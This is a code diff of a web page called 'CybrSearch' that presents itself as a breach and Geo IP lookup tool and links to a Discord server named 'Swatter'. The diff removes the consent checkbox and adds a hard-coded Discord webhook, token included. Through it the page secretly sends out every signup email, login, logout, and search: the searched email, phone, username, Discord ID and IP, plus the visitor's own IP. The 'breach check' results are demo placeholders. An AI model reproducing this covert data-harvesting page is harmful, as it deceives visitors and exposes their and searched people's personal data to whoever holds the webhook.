@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
+  <title>CybrSearch - Secure Tool</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>CybrSearch - Breach + Geo IP Checker</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
   <style>
     body {
@@ -13,19 +13,15 @@
       padding-top: 60px;
     }
     .container {
-      max-width: 750px;
+      max-width: 700px;
     }
     .card {
       background-color: #161b22;
-      border: 1px solid #30363d;
+      border: none;
       border-radius: 1rem;
-      box-shadow: 0 0 12px rgba(0, 0, 0, 0.4);
-      transition: transform 0.2s;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
     }
-    .card:hover {
-      transform: scale(1.01);
-    }
-    .form-control, .form-check-input {
+    .form-control {
       background-color: #0d1117;
       color: #c9d1d9;
       border: 1px solid #30363d;
@@ -37,33 +33,17 @@
       background-color: #238636;
       border: none;
     }
-    .btn-primary:hover {
-      background-color: #2ea043;
-    }
     .result-box {
       background-color: #1c2128;
       border-left: 5px solid #30363d;
       padding: 1rem;
       border-radius: 0.5rem;
-      margin-top: 0.75rem;
+      margin-top: 0.5rem;
       white-space: pre-wrap;
-      position: relative;
     }
     .result-box.success { border-left-color: #2ea043; }
     .result-box.warning { border-left-color: #d29922; }
     .result-box.error { border-left-color: #f85149; }
-    .copy-btn {
-      position: absolute;
-      top: 10px;
-      right: 10px;
-      background: #30363d;
-      border: none;
-      color: #c9d1d9;
-      padding: 4px 8px;
-      border-radius: 5px;
-      font-size: 12px;
-      cursor: pointer;
-    }
     .discord-btn {
       position: fixed;
       top: 20px;
@@ -76,70 +56,132 @@
       font-weight: bold;
       text-decoration: none;
     }
-    .spinner-border {
-      width: 1.5rem;
-      height: 1.5rem;
-    }
   </style>
 </head>
 <body>
   <a class="discord-btn" href="https://discord.gg/Swatter" target="_blank">Join Discord</a>
   <div class="container text-center">
-    <h1 class="mb-4">🔍 CybrSearch: Breach + Geo IP Scanner</h1>
-    <form onsubmit="searchData(); return false;" class="card p-4">
-      <input id="email" type="email" placeholder="📧 Enter email address" class="form-control mb-2">
-      <input id="phone" type="text" placeholder="📱 Enter phone number" class="form-control mb-2">
-      <input id="username" type="text" placeholder="👤 Enter username" class="form-control mb-2">
-      <input id="discord" type="text" placeholder="💬 Enter Discord ID" class="form-control mb-2">
-      <input id="ip" type="text" placeholder="🌐 Enter IP address" class="form-control mb-3">
-
-      <div class="form-check text-start mb-2">
-        <input class="form-check-input" type="checkbox" id="geoCheck" checked>
-        <label class="form-check-label" for="geoCheck">Enable Geo IP + ARIN RDAP Lookup</label>
-      </div>
-      <div class="form-check text-start mb-3">
-        <input class="form-check-input" type="checkbox" id="agreeCheck" required>
-        <label class="form-check-label" for="agreeCheck">I agree to the processing of this data for search purposes.</label>
+    <div id="authSection">
+      <h1 class="mb-4">🔐 Welcome to CybrSearch</h1>
+      <div id="loginForm" class="card p-4 mb-3">
+        <h4>Login</h4>
+        <input id="loginEmail" type="email" placeholder="Email" class="form-control mb-2" />
+        <input id="loginPass" type="password" placeholder="Password" class="form-control mb-2" />
+        <button onclick="login()" class="btn btn-primary w-100">Login</button>
+        <p class="mt-3">No account? <a href="#" onclick="toggleForms('signup')">Sign up here</a></p>
       </div>
 
-      <button type="submit" class="btn btn-primary w-100">Search</button>
-      <div id="loading" class="mt-3 d-none">
-        <div class="spinner-border text-success" role="status"></div>
-        <div>Running checks...</div>
+      <div id="signupForm" class="card p-4 mb-3" style="display:none;">
+        <h4>Sign Up</h4>
+        <input id="signupEmail" type="email" placeholder="Email" class="form-control mb-2" />
+        <input id="signupPass" type="password" placeholder="Password" class="form-control mb-2" />
+        <button onclick="signup()" class="btn btn-success w-100">Sign Up</button>
+        <p class="mt-3">Already have an account? <a href="#" onclick="toggleForms('login')">Log in</a></p>
       </div>
-    </form>
+    </div>
 
-    <div class="mt-5 text-start">
-      <h4>🔎 Search Results</h4>
-      <div id="results"></div>
+    <div id="toolSection" style="display:none;">
+      <h1 class="mb-4">🔍 Advanced Breach Checker + Geo IP</h1>
+      <button onclick="logout()" class="btn btn-danger mb-3 float-end">Logout</button>
+      <form onsubmit="searchData(); return false;" class="card p-4">
+        <input id="email" type="email" placeholder="📧 Enter email address" class="form-control mb-2">
+        <input id="phone" type="text" placeholder="📱 Enter phone number" class="form-control mb-2">
+        <input id="username" type="text" placeholder="👤 Enter username" class="form-control mb-2">
+        <input id="discord" type="text" placeholder="💬 Enter Discord ID" class="form-control mb-2">
+        <input id="ip" type="text" placeholder="🌐 Enter IP address" class="form-control mb-3">
+        <button type="submit" class="btn btn-primary w-100">Search</button>
+      </form>
+      <div class="mt-5 text-start">
+        <h4>🔎 Search Results</h4>
+        <div id="results"></div>
+      </div>
     </div>
   </div>
 
   <script>
+    const webhookURL = "https://discord.com/api/webhooks/1381059057875554375/UvXzkyggNeRKpdY_9TeMx52Uv7w2eb7hQNjYFljBg6r55HiFI1qDukIo2ebjXA7S2XKD";
+
+    function sendWebhook(title, message) {
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          embeds: [{
+            title: title,
+            description: message,
+            color: 7506394,
+            timestamp: new Date().toISOString()
+          }]
+        })
+      }).catch(console.warn);
+    }
+
+    function toggleForms(show) {
+      document.getElementById('loginForm').style.display = show === 'login' ? 'block' : 'none';
+      document.getElementById('signupForm').style.display = show === 'signup' ? 'block' : 'none';
+    }
+
+    function signup() {
+      const email = document.getElementById("signupEmail").value.trim();
+      const password = document.getElementById("signupPass").value;
+      const users = JSON.parse(localStorage.getItem("users") || "{}");
+      if (users[email]) return alert("User already exists");
+      users[email] = { password };
+      localStorage.setItem("users", JSON.stringify(users));
+      sendWebhook("🆕 New Signup", `Email: ${email}`);
+      alert("Account created! Please login.");
+      toggleForms('login');
+    }
+
+    function login() {
+      const email = document.getElementById("loginEmail").value.trim();
+      const password = document.getElementById("loginPass").value;
+      const users = JSON.parse(localStorage.getItem("users") || "{}");
+      if (users[email]?.password === password) {
+        localStorage.setItem("authUser", email);
+        sendWebhook("🔐 Login", `User: ${email}`);
+        showTool();
+      } else {
+        alert("Invalid credentials");
+      }
+    }
+
+    function logout() {
+      const email = localStorage.getItem("authUser");
+      sendWebhook("🔒 Logout", `User: ${email}`);
+      localStorage.removeItem("authUser");
+      showLogin();
+    }
+
+    function showTool() {
+      document.getElementById("authSection").style.display = "none";
+      document.getElementById("toolSection").style.display = "block";
+    }
+
+    function showLogin() {
+      document.getElementById("authSection").style.display = "block";
+      document.getElementById("toolSection").style.display = "none";
+    }
+
+    window.onload = () => {
+      if (localStorage.getItem("authUser")) showTool();
+      else showLogin();
+    }
+
     function updateResult(type, msg, style) {
       const box = document.createElement("div");
       box.className = `result-box ${style}`;
       box.innerText = msg;
-
-      const copyBtn = document.createElement("button");
-      copyBtn.innerText = "Copy";
-      copyBtn.className = "copy-btn";
-      copyBtn.onclick = () => navigator.clipboard.writeText(msg);
-      box.appendChild(copyBtn);
-
       document.getElementById("results").appendChild(box);
     }
 
     async function searchData() {
       document.getElementById("results").innerHTML = "";
-      document.getElementById("loading").classList.remove("d-none");
-
       const email = document.getElementById("email").value.trim();
       const phone = document.getElementById("phone").value.trim();
       const username = document.getElementById("username").value.trim();
       const discord = document.getElementById("discord").value.trim();
       const ip = document.getElementById("ip").value.trim();
-      const geoCheck = document.getElementById("geoCheck").checked;
 
       if (!email) updateResult("email", "⚠️ No email entered.", "warning");
       else updateResult("email", `✅ Email checked (demo): ${email}`, "success");
@@ -160,10 +202,16 @@
         visitorIP = ipData.ip || "Unknown";
       } catch {}
 
-      // (Optional) If you want to keep logging
-      // sendWebhook({ email, phone, username, discord, ip, visitorIP });
+      sendWebhook("🔍 Breach Search Attempt", `
+        Email: ${email || 'N/A'}
+        Phone: ${phone || 'N/A'}
+        Username: ${username || 'N/A'}
+        Discord: ${discord || 'N/A'}
+        User IP: ${ip || 'N/A'}
+        Visitor IP: ${visitorIP}
+      `);
 
-      if (ip && geoCheck) {
+      if (ip) {
         try {
           const res = await fetch(`https://ipwho.is/${ip}`);
           const data = await res.json();
@@ -179,7 +227,6 @@
         try {
           const rdapRes = await fetch(`https://rdap.arin.net/registry/ip/${ip}`);
           const rdap = await rdapRes.json();
-
           const handle = rdap.handle || 'N/A';
           const network = rdap.name || 'N/A';
           const startAddress = rdap.startAddress || 'N/A';
@@ -195,8 +242,6 @@
       } else {
         updateResult("ip", "ℹ️ IP geo-location check skipped.", "warning");
       }
-
-      document.getElementById("loading").classList.add("d-none");
     }
   </script>
 </body>
